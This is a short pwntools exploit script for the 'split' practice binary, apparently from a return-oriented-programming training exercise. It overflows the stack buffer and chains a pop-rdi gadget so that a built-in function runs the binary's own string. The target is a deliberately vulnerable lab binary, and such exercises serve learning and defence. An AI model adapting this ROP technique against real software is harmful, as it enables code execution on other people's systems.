#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template split
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'split')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:      Partial RELRO
# Stack:      No canary found
# NX:         NX enabled
# PIE:        No PIE (0x400000)
# Stripped:   No

RIP_DIST = 40

POP_RDI = 0x00000000004007c3

log.info("use the pop usefulString into rdi and then ret to the winning gadget")

io = start()

io.sendline(cyclic(40) +
            flat(POP_RDI) + flat(exe.symbols['usefulString']) +
            flat(exe.symbols['usefulFunction'] + 9)
        )

io.interactive()

